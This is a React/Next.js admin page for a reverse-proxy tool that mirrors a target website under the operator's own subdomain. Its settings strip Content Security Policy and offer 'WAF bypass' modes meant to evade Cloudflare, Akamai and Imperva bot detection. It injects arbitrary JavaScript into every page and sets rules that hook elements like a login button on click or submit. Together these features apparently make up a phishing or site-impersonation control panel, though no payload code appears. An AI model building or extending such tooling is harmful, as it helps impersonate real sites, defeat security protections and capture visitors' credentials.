import * as React from "react";
import { useRouter } from "next/router";
import Link from "next/link";
import {
  PanelLeft, ArrowLeft, Plus, Trash2, Target, Activity, Crosshair,
  ExternalLink, X, Code2, Shield, Globe, Wifi, FileCode, Save, Loader2,
  AlertCircle, Check,
} from "lucide-react";
import { AppSidebar } from "@/components/app-sidebar";
import { Drawer, cx, Card, BlueButton, GhostButton, Toggle, SectionHeading, SegmentedNav, Badge, Favicon, ConfirmDialog } from "@/components/ui";
import { useIsDesktop } from "@/components/use-media-query";
import { api, siteUrl, BASE_DOMAIN, BASE_DOMAINS } from "@/lib-engine/api";

const CSP_MODES = [
  { value: "strip", label: "Strip" },
  { value: "rewrite", label: "Rewrite" },
  { value: "none", label: "None" },
];

const WAF_MODES = [
  { value: "none", label: "Disabled", desc: "No header manipulation — requests pass through unchanged." },
  { value: "header-shuffle", label: "Header shuffle", desc: "Randomizes the order of accept, accept-language, accept-encoding, cache-control, and pragma headers on every request. Breaks header-order fingerprinting used by Cloudflare, Akamai, and Imperva to detect proxy/bot traffic." },
  { value: "lowercase-headers", label: "Lowercase headers", desc: "Forces all header names to lowercase. Some WAFs treat mixed-case headers (e.g. Accept vs accept) as non-browser traffic; lowercasing normalizes them to match real browser output." },
  { value: "chunked", label: "Chunked transfer", desc: "On POST/PUT requests, replaces content-length with transfer-encoding: chunked. Some WAFs inspect content-length to detect automated tools; chunked encoding bypasses those checks." },
];

function DefaultBadge({ isDefault }) {
  if (!isDefault) return null;
  return (
    <span className="ml-[6px] rounded-[3px] bg-pressed px-[5px] py-[1px] text-[9.5px] font-medium text-fg3">
      default
    </span>
  );
}

export default function SiteDetailPage() {
  const router = useRouter();
  const { id } = router.query;
  const isDesktop = useIsDesktop();
  const [collapsed, setCollapsed] = React.useState(false);
  const [drawerOpen, setDrawerOpen] = React.useState(false);

  const [site, setSite] = React.useState(null);
  const [rules, setRules] = React.useState([]);
  const [tracked, setTracked] = React.useState([]);
  const [health, setHealth] = React.useState(null);
  const [loading, setLoading] = React.useState(true);
  const [error, setError] = React.useState("");
  const [confirmDelete, setConfirmDelete] = React.useState(null);

  const [config, setConfig] = React.useState({
    mode: "dev",
    csp_mode: "strip",
    wildcard: false,
    custom_js: "",
    custom_css: "",
    waf_bypass: "none",
    subdomains: [],
    inject_orig_domain: false,
    egress_mode: "direct",
  });
  const [newSubdomain, setNewSubdomain] = React.useState("");
  const [savingConfig, setSavingConfig] = React.useState(false);
  const [configSaved, setConfigSaved] = React.useState(false);

  const [showRuleForm, setShowRuleForm] = React.useState(false);
  const [editingRule, setEditingRule] = React.useState(null);
  const [ruleSelector, setRuleSelector] = React.useState("");
  const [ruleTrigger, setRuleTrigger] = React.useState("click");
  const [ruleEventName, setRuleEventName] = React.useState("");
  const [ruleCode, setRuleCode] = React.useState("");
  const [ruleEnabled, setRuleEnabled] = React.useState(true);
  const [ruleSaving, setRuleSaving] = React.useState(false);
  const [ruleError, setRuleError] = React.useState("");

  const showFloatingToggle = isDesktop ? collapsed : true;

  const load = React.useCallback(async () => {
    if (!id) return;
    setLoading(true);
    try {
      const [s, r, t, h] = await Promise.all([
        api.getSite(id).catch(() => null),
        api.listRules(id).catch(() => []),
        api.listTrackedElements(id).catch(() => []),
        api.siteHealth().catch(() => ({})),
      ]);
      setSite(s);
      setRules(Array.isArray(r) ? r : []);
      setTracked(Array.isArray(t) ? t : []);
      setHealth(h?.[id] || null);
      if (s) {
        setConfig({
          mode: s.mode === "live" ? "live" : "dev",
          csp_mode: s.csp_mode || "strip",
          wildcard: Boolean(s.wildcard),
          custom_js: s.custom_js || "",
          custom_css: s.custom_css || "",
          waf_bypass: s.waf_bypass || "none",
          subdomains: s.subdomains || [],
          inject_orig_domain: Boolean(s.inject_orig_domain),
          egress_mode: s.egress_mode || "direct",
        });
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }, [id]);

  React.useEffect(() => {
    if (id) load();
  }, [id, load]);

  function updateConfig(key, value) {
    setConfig((c) => ({ ...c, [key]: value }));
    setConfigSaved(false);
  }

  async function handleSaveConfig(e) {
    e.preventDefault();
    setSavingConfig(true);
    setError("");
    try {
      await api.updateSite(site.id, {
        mode: config.mode,
        csp_mode: config.csp_mode,
        wildcard: config.wildcard,
        custom_js: config.custom_js,
        custom_css: config.custom_css,
        waf_bypass: config.waf_bypass,
        subdomains: config.subdomains,
        inject_orig_domain: config.inject_orig_domain,
        egress_mode: config.egress_mode,
      });
      setConfigSaved(true);
      setTimeout(() => setConfigSaved(false), 2000);
      await load();
    } catch (err) {
      setError(err.message);
    } finally {
      setSavingConfig(false);
    }
  }

  function addSubdomain() {
    const val = newSubdomain.trim().toLowerCase();
    if (!val) return;
    if (config.subdomains.includes(val)) return;
    updateConfig("subdomains", [...config.subdomains, val]);
    setNewSubdomain("");
  }

  function removeSubdomain(prefix) {
    updateConfig("subdomains", config.subdomains.filter((s) => s !== prefix));
  }

  const [discovering, setDiscovering] = React.useState(false);
  async function handleDiscoverSubdomains() {
    if (!site) return;
    setDiscovering(true);
    try {
      const res = await api.discoverSubdomains(site.id);
      if (res.detected && Array.isArray(res.subdomains)) {
        const merged = [...new Set([...config.subdomains, ...res.subdomains])];
        updateConfig("subdomains", merged);
      }
    } catch (err) {
      setError(err.message || "Discovery failed");
    } finally {
      setDiscovering(false);
    }
  }

  function resetRuleForm() {
    setRuleSelector("");
    setRuleTrigger("click");
    setRuleEventName("");
    setRuleCode("");
    setRuleEnabled(true);
    setEditingRule(null);
    setRuleError("");
  }

  function openEditRule(rule) {
    setEditingRule(rule);
    setRuleSelector(rule.selector || "");
    setRuleTrigger(rule.trigger || "click");
    setRuleEventName(rule.event_name || "");
    setRuleCode(rule.code || "");
    setRuleEnabled(rule.enabled);
    setShowRuleForm(true);
    setRuleError("");
  }

  async function handleSaveRule(e) {
    e.preventDefault();
    if (!ruleSelector.trim()) {
      setRuleError("Selector is required");
      return;
    }
    setRuleSaving(true);
    setRuleError("");
    try {
      const payload = {
        site_id: id,
        selector: ruleSelector.trim(),
        trigger: ruleTrigger,
        event_name: ruleEventName.trim() || undefined,
        code: ruleCode.trim() || undefined,
        enabled: ruleEnabled,
      };
      if (editingRule) {
        await api.updateRule(editingRule.id, payload, id);
      } else {
        await api.createRule(payload);
      }
      resetRuleForm();
      setShowRuleForm(false);
      await load();
    } catch (err) {
      setRuleError(err.message);
    } finally {
      setRuleSaving(false);
    }
  }

  async function handleToggleRule(rule) {
    try {
      await api.toggleRule(rule.id, !rule.enabled, id);
      await load();
    } catch (err) {
      setError(err.message);
    }
  }

  async function handleDeleteRule(ruleId) {
    setConfirmDelete({ type: 'rule', id: ruleId });
  }

  async function handleDeleteTracked(trackId) {
    setConfirmDelete({ type: 'tracked', id: trackId });
  }

  async function performDelete() {
    if (!confirmDelete) return;
    const { type, id: itemId } = confirmDelete;
    setConfirmDelete(null);
    try {
      if (type === 'rule') {
        await api.deleteRule(itemId, id);
      } else if (type === 'tracked') {
        await api.deleteTrackedElement(id, itemId);
      }
      await load();
    } catch (err) {
      setError(err.message);
    }
  }

  async function handleToggleLive() {
    if (!site) return;
    const newMode = site.mode === "live" ? "dev" : "live";
    try {
      await api.updateSite(site.id, { mode: newMode });
      await load();
    } catch (err) {
      setError(err.message);
    }
  }

  const hs = health?.status || "unknown";
  const isLive = site?.mode === "live";
  const url = site ? siteUrl(site) : "";
  const inputCls = "h-[30px] w-full rounded-[6px] border border-stroke bg-raised px-[10px] text-[12.5px] text-fg outline-none focus:border-accent";
  const taCls = "w-full rounded-[6px] border border-stroke bg-raised px-[10px] py-[8px] text-[12px] font-mono text-fg outline-none focus:border-accent";

  return (
    <div className="flex h-screen w-full overflow-hidden bg-canvas">
      {isDesktop ? (
        <AppSidebar collapsed={collapsed} onToggle={() => setCollapsed((v) => !v)} />
      ) : (
        <Drawer open={drawerOpen} onClose={() => setDrawerOpen(false)}>
          <AppSidebar collapsed={false} variant="drawer" onToggle={() => setDrawerOpen(false)} />
        </Drawer>
      )}

      <main className="scroll-thin relative flex-1 overflow-y-auto">
        {showFloatingToggle ? (
          <button
            type="button"
            title={isDesktop ? "Expand sidebar" : "Open menu"}
            onClick={() => (isDesktop ? setCollapsed(false) : setDrawerOpen(true))}
            className="absolute left-[14px] top-[10px] z-20 flex h-[26px] w-[26px] items-center justify-center rounded-[5px] text-fg2 transition-colors hover:bg-line hover:text-fg md:left-[20px] md:top-[8px] md:h-[24px] md:w-[24px]"
          >
            <PanelLeft className="h-[15px] w-[15px]" strokeWidth={1.8} />
          </button>
        ) : null}

        <div className="mx-auto w-full max-w-[760px] px-[16px] pb-[80px] pt-[60px] md:px-[24px] md:pt-[72px]">
          <div className="mb-[16px] px-[8px]">
            <Link href="/sites" className="inline-flex items-center gap-[5px] text-[12.5px] text-fg3 transition-colors hover:text-fg">
              <ArrowLeft className="h-[13px] w-[13px]" strokeWidth={1.8} />
              Back to proxy sites
            </Link>
          </div>

          {error ? (
            <div className="mb-[12px] flex items-center gap-[8px] border-l-2 border-error px-[8px] py-[6px] text-[12.5px] text-error">
              <AlertCircle className="h-[14px] w-[14px] shrink-0" />
              {error}
            </div>
          ) : null}

          {loading ? (
            <Card className="p-[24px] text-center text-[12.5px] text-fg3">Loading site…</Card>
          ) : !site ? (
            <Card className="p-[24px] text-center text-[12.5px] text-fg3">Site not found.</Card>
          ) : (
            <>
              {}
              <Card className="mb-[16px] p-[16px]">
                <div className="flex flex-col gap-[12px] sm:flex-row sm:items-start sm:justify-between">
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-[10px]">
                      <Favicon url={site.target_url} subdomain={site.subdomain} size={32} />
                      <div className="min-w-0">
                        <div className="flex items-center gap-[8px]">
                          <h1 className="truncate text-[16px] font-semibold text-fg">{site.subdomain}</h1>
                          <span
                            className={cx(
                              "text-[10px] font-medium uppercase",
                              hs === "up" ? "text-fg" : hs === "down" ? "text-error" : "text-fg4"
                            )}
                          >
                            {hs}
                          </span>
                        </div>
                        <div className="mt-[2px] truncate text-[12.5px] text-fg3">{site.target_url}</div>
                      </div>
                    </div>
                    <div className="mt-[10px] flex flex-wrap items-center gap-[10px] text-[11.5px] text-fg4">
                      <span className="flex items-center gap-[4px]">
                        <Activity className="h-[11px] w-[11px]" strokeWidth={1.8} />
                        {hs}
                      </span>
                      <span className="flex items-center gap-[4px]">
                        <Target className="h-[11px] w-[11px]" strokeWidth={1.8} />
                        {rules.length} rules
                      </span>
                      <span className="flex items-center gap-[4px]">
                        <Crosshair className="h-[11px] w-[11px]" strokeWidth={1.8} />
                        {tracked.length} tracked
                      </span>
                      {site.base_domain ? <span>.{site.base_domain}</span> : null}
                      {site.wildcard ? <Badge>Wildcard</Badge> : null}
                    </div>
                  </div>
                  <div className="flex shrink-0 items-center gap-[8px]">
                    <div className="flex items-center gap-[6px]">
                      <span className="text-[11px] text-fg4">{isLive ? "Live" : "Dev"}</span>
                      <Toggle checked={isLive} onChange={handleToggleLive} label="Toggle live" />
                    </div>
                    <a
                      href={url}
                      target="_blank"
                      rel="noreferrer"
                      className="group flex h-[26px] items-center gap-[4px] text-[12px] text-fg transition-colors hover:text-accent"
                    >
                      <span className="border-b border-line pb-[1px] transition-colors group-hover:border-accent">Open</span>
                      <ExternalLink className="h-[12px] w-[12px] text-fg4 transition-colors group-hover:text-accent" strokeWidth={1.8} />
                    </a>
                  </div>
                </div>
              </Card>

              {}
                <div className="mb-[20px] px-[8px]">
                  <SectionHeading title="Proxy configuration" description="Control how the proxy handles requests — mode, CSP, WAF bypass, custom injections, and wildcard settings." className="mb-[10px]" />
                  <Card className="p-[16px]">
                    <form onSubmit={handleSaveConfig} className="space-y-[16px]">
                      {}
                      <div>
                        <label className="mb-[6px] flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                          <Code2 className="h-[12px] w-[12px]" /> Mode
                        </label>
                        <SegmentedNav
                          options={[{ value: "dev", label: "Dev (toolbar)" }, { value: "live", label: "Live (clean)" }]}
                          value={config.mode}
                          onChange={(v) => updateConfig("mode", v)}
                        />
                      </div>

                      {}
                      <div>
                        <label className="mb-[6px] flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                          <Shield className="h-[12px] w-[12px]" /> CSP Mode
                          <DefaultBadge isDefault={config.csp_mode === "strip"} />
                        </label>
                        <SegmentedNav
                          options={CSP_MODES}
                          value={config.csp_mode}
                          onChange={(v) => updateConfig("csp_mode", v)}
                        />
                      </div>

                      {}
                      <div>
                        <label className="mb-[6px] flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                          <Globe className="h-[12px] w-[12px]" /> WAF Bypass
                          <DefaultBadge isDefault={config.waf_bypass === "none"} />
                        </label>
                        <SegmentedNav
                          options={WAF_MODES}
                          value={config.waf_bypass}
                          onChange={(v) => updateConfig("waf_bypass", v)}
                        />
                        <p className="mt-[6px] text-[11px] leading-[15px] text-fg4">
                          {WAF_MODES.find((m) => m.value === (config.waf_bypass || "none"))?.desc}
                        </p>
                      </div>

                      {}
                      <div>
                        <label className="mb-[6px] block text-[12px] font-medium text-fg2">
                          IP egress mode
                        </label>
                        <p className="text-[12px] text-fg3">Direct — traffic exits via this server's IP address.</p>
                      </div>

                      {}
                      <div className="flex items-center justify-between">
                        <div>
                          <label className="flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                            <Wifi className="h-[12px] w-[12px]" /> Wildcard mode
                          </label>
                          <p className="mt-[2px] text-[11.5px] text-fg4">Proxy all subdomains of the target</p>
                        </div>
                        <Toggle checked={config.wildcard} onChange={(v) => updateConfig("wildcard", v)} label="Wildcard" />
                      </div>

                      {}
                      <div className="flex items-center justify-between">
                        <div>
                          <label className="flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                            <Globe className="h-[12px] w-[12px]" /> Inject original domain
                            <DefaultBadge isDefault={config.inject_orig_domain === false} />
                          </label>
                          <p className="mt-[2px] text-[11.5px] text-fg4">Injects <code className="text-fg3">window.__origDomain</code> with the target site&apos;s URL (e.g. <code className="text-fg3">https://polymarket.com</code>) into <code className="text-fg3">&lt;head&gt;</code> before any other scripts load. Injected scripts can read this to know the original domain.</p>
                        </div>
                        <Toggle checked={config.inject_orig_domain} onChange={(v) => updateConfig("inject_orig_domain", v)} label="Inject" />
                      </div>

                      {}
                      {config.wildcard ? (
                        <div>
                          <div className="mb-[6px] flex items-center justify-between">
                            <label className="block text-[12px] font-medium text-fg2">Subdomain prefixes</label>
                            <button
                              type="button"
                              onClick={handleDiscoverSubdomains}
                              disabled={discovering}
                              className="flex items-center gap-[4px] rounded-[5px] border border-stroke bg-raised px-[8px] py-[3px] text-[11px] text-fg3 hover:text-fg hover:bg-pressed disabled:opacity-50"
                            >
                              {discovering ? <Loader2 className="h-[11px] w-[11px] animate-spin" /> : <Crosshair className="h-[11px] w-[11px]" />}
                              {discovering ? "Scanning..." : "Discover"}
                            </button>
                          </div>
                          <div className="flex gap-[6px]">
                            <input
                              type="text"
                              value={newSubdomain}
                              onChange={(e) => setNewSubdomain(e.target.value)}
                              onKeyDown={(e) => { if (e.key === "Enter") { e.preventDefault(); addSubdomain(); } }}
                              placeholder="app, admin, www..."
                              className={inputCls}
                            />
                            <button type="button" onClick={addSubdomain} className="flex h-[30px] shrink-0 items-center gap-[4px] rounded-[6px] border border-stroke bg-raised px-[10px] text-[12px] text-fg hover:bg-pressed">
                              <Plus className="h-[12px] w-[12px]" /> Add
                            </button>
                          </div>
                          {config.subdomains.length > 0 ? (
                            <div className="mt-[8px] flex flex-wrap gap-[6px]">
                              {config.subdomains.map((prefix) => (
                                <span key={prefix} className="flex items-center gap-[5px] rounded-[5px] border border-stroke bg-raised px-[8px] py-[3px] text-[11.5px] text-fg2">
                                  {prefix}
                                  <button type="button" onClick={() => removeSubdomain(prefix)} className="text-fg4 hover:text-error">
                                    <X className="h-[10px] w-[10px]" />
                                  </button>
                                </span>
                              ))}
                            </div>
                          ) : null}
                        </div>
                      ) : null}

                      {}
                      <div>
                        <label className="mb-[6px] flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                          <FileCode className="h-[12px] w-[12px]" /> Custom JS injection
                        </label>
                        <textarea
                          value={config.custom_js}
                          onChange={(e) => updateConfig("custom_js", e.target.value)}
                          rows={4}
                          placeholder="// JavaScript to inject on every page"
                          className={taCls}
                        />
                        <p className="mt-[4px] text-[11.5px] text-fg4">JavaScript code injected into every page served by this proxy. Runs before the page's own scripts. Use for tracking, analytics, or modifying page behavior.</p>
                      </div>

                      {}
                      <div>
                        <label className="mb-[6px] flex items-center gap-[5px] text-[12px] font-medium text-fg2">
                          <FileCode className="h-[12px] w-[12px]" /> Custom CSS injection
                        </label>
                        <textarea
                          value={config.custom_css}
                          onChange={(e) => updateConfig("custom_css", e.target.value)}
                          rows={4}
                          placeholder="/* CSS to inject on every page */"
                          className={taCls}
                        />
                        <p className="mt-[4px] text-[11.5px] text-fg4">CSS styles injected into every page. Use to hide elements, change colors, or adjust the layout of the proxied site.</p>
                      </div>

                      {}
                      <div className="flex items-center gap-[8px] pt-[4px]">
                        <BlueButton type="submit" disabled={savingConfig}>
                          {savingConfig ? (
                            <><Loader2 className="h-[13px] w-[13px] animate-spin" /> Saving…</>
                          ) : (
                            <><Save className="h-[13px] w-[13px]" /> Save config</>
                          )}
                        </BlueButton>
                        {configSaved ? (
                          <span className="flex items-center gap-[4px] text-[12px] text-fg">
                            <Check className="h-[12px] w-[12px]" /> Saved
                          </span>
                        ) : null}
                      </div>
                    </form>
                  </Card>
                </div>

              {}
              <div className="mb-[20px] px-[8px]">
                <div className="mb-[10px] flex flex-col gap-[8px] sm:flex-row sm:items-center sm:justify-between">
                  <SectionHeading title="Rules" description="Injection and override rules for this site." className="mb-0" />
                  <BlueButton onClick={() => { resetRuleForm(); setShowRuleForm((v) => !v); }}>
                    <Plus className="h-[13px] w-[13px]" strokeWidth={2} />
                    Add rule
                  </BlueButton>
                </div>

                {showRuleForm ? (
                  <Card className="mb-[10px] p-[16px]">
                    <div className="mb-[10px] flex items-center justify-between">
                      <span className="text-[13px] font-medium text-fg">
                        {editingRule ? "Edit rule" : "New rule"}
                      </span>
                      <button
                        type="button"
                        onClick={() => { setShowRuleForm(false); resetRuleForm(); }}
                        className="flex h-[22px] w-[22px] items-center justify-center rounded-[5px] text-fg3 hover:bg-line hover:text-fg"
                      >
                        <X className="h-[13px] w-[13px]" strokeWidth={1.8} />
                      </button>
                    </div>
                    <form onSubmit={handleSaveRule} className="space-y-[10px]">
                      <div>
                        <label className="mb-[3px] block text-[11.5px] text-fg3">CSS Selector</label>
                        <input
                          type="text"
                          value={ruleSelector}
                          onChange={(e) => setRuleSelector(e.target.value)}
                          placeholder="#login-button"
                          className={inputCls}
                        />
                      </div>
                      <div className="flex flex-col gap-[10px] sm:flex-row">
                        <div className="flex-1">
                          <label className="mb-[3px] block text-[11.5px] text-fg3">Trigger</label>
                          <select
                            value={ruleTrigger}
                            onChange={(e) => setRuleTrigger(e.target.value)}
                            className={inputCls}
                          >
                            <option value="click">click</option>
                            <option value="submit">submit</option>
                            <option value="load">load</option>
                            <option value="change">change</option>
                            <option value="custom">custom</option>
                          </select>
                        </div>
                        <div className="flex-1">
                          <label className="mb-[3px] block text-[11.5px] text-fg3">Event name (optional)</label>
                          <input
                            type="text"
                            value={ruleEventName}
                            onChange={(e) => setRuleEventName(e.target.value)}
                            placeholder="login_click"
                            className={inputCls}
                          />
                        </div>
                      </div>
                      <div>
                        <label className="mb-[3px] block text-[11.5px] text-fg3">Code (optional)</label>
                        <textarea
                          value={ruleCode}
                          onChange={(e) => setRuleCode(e.target.value)}
                          placeholder="// custom JS"
                          rows={3}
                          className={taCls}
                        />
                      </div>
                      <div className="flex items-center gap-[8px]">
                        <Toggle checked={ruleEnabled} onChange={setRuleEnabled} label="Enabled" />
                        <span className="text-[12px] text-fg3">Enabled</span>
                      </div>
                      {ruleError ? (
                        <div className="text-[12px] text-error">{ruleError}</div>
                      ) : null}
                      <div className="flex items-center gap-[8px] pt-[4px]">
                        <BlueButton type="submit" disabled={ruleSaving}>
                          {ruleSaving ? "Saving…" : editingRule ? "Update rule" : "Create rule"}
                        </BlueButton>
                        <GhostButton onClick={() => { setShowRuleForm(false); resetRuleForm(); }}>
                          Cancel
                        </GhostButton>
                      </div>
                    </form>
                  </Card>
                ) : null}

                {rules.length === 0 ? (
                  <Card className="p-[20px] text-center text-[12.5px] text-fg3">
                    No rules yet. Add your first rule to track elements and trigger actions.
                  </Card>
                ) : (
                  <div className="space-y-[6px]">
                    {rules.map((rule) => (
                      <Card key={rule.id} className="px-[14px] py-[12px]">
                        <div className="flex items-center gap-[10px]">
                          <span
                            className={cx(
                              "text-[10px] font-medium uppercase",
                              rule.enabled ? "text-fg" : "text-fg4"
                            )}
                          >
                            {rule.enabled ? "on" : "off"}
                          </span>
                          <div className="min-w-0 flex-1">
                            <div className="flex items-center gap-[8px]">
                              <code className="truncate text-[12.5px] text-fg">{rule.selector}</code>
                              <Badge>{rule.trigger}</Badge>
                            </div>
                            {rule.event_name ? (
                              <div className="mt-[2px] text-[11.5px] text-fg4">→ {rule.event_name}</div>
                            ) : null}
                          </div>
                          <div className="flex shrink-0 items-center gap-[4px]">
                            <button
                              type="button"
                              onClick={() => handleToggleRule(rule)}
                              className="flex h-[24px] w-[24px] items-center justify-center rounded-[5px] text-fg3 hover:bg-line hover:text-fg"
                              title={rule.enabled ? "Disable" : "Enable"}
                            >
                              <Toggle checked={rule.enabled} onChange={() => handleToggleRule(rule)} label="" />
                            </button>
                            <button
                              type="button"
                              onClick={() => openEditRule(rule)}
                              className="flex h-[24px] w-[24px] items-center justify-center rounded-[5px] text-fg3 hover:bg-line hover:text-fg"
                              title="Edit"
                            >
                              <FileCode className="h-[13px] w-[13px]" strokeWidth={1.8} />
                            </button>
                            <button
                              type="button"
                              onClick={() => handleDeleteRule(rule.id)}
                              className="flex h-[24px] w-[24px] items-center justify-center rounded-[5px] text-fg3 hover:bg-line hover:text-error"
                              title="Delete"
                            >
                              <Trash2 className="h-[13px] w-[13px]" strokeWidth={1.8} />
                            </button>
                          </div>
                        </div>
                      </Card>
                    ))}
                  </div>
                )}
              </div>

              {}
              <div className="mb-[20px] px-[8px]">
                <SectionHeading title="Tracked elements" description="Elements being tracked on this site." className="mb-[10px]" />
                {tracked.length === 0 ? (
                  <Card className="p-[20px] text-center text-[12.5px] text-fg3">
                    No tracked elements yet.
                  </Card>
                ) : (
                  <div className="space-y-[6px]">
                    {tracked.map((t) => (
                      <Card key={t.id} className="px-[14px] py-[12px]">
                        <div className="flex items-center gap-[10px]">
                          <Crosshair className="h-[13px] w-[13px] shrink-0 text-fg3" strokeWidth={1.8} />
                          <div className="min-w-0 flex-1">
                            <code className="truncate text-[12.5px] text-fg">{t.selector}</code>
                            {t.event_name ? (
                              <div className="mt-[2px] text-[11.5px] text-fg4">→ {t.event_name}</div>
                            ) : null}
                          </div>
                          <button
                            type="button"
                            onClick={() => handleDeleteTracked(t.id)}
                            className="flex h-[24px] w-[24px] shrink-0 items-center justify-center rounded-[5px] text-fg3 hover:bg-line hover:text-error"
                            title="Delete"
                          >
                            <Trash2 className="h-[13px] w-[13px]" strokeWidth={1.8} />
                          </button>
                        </div>
                      </Card>
                    ))}
                  </div>
                )}
              </div>
            </>
          )}
        </div>
      </main>
      <ConfirmDialog
        open={!!confirmDelete}
        onClose={() => setConfirmDelete(null)}
        onConfirm={performDelete}
        title={confirmDelete?.type === 'rule' ? 'Delete rule?' : 'Delete tracked element?'}
        message={confirmDelete?.type === 'rule' ? 'This rule will be permanently removed.' : 'This tracked element will be permanently removed.'}
        confirmLabel="Delete"
        danger
      />
    </div>
  );
}
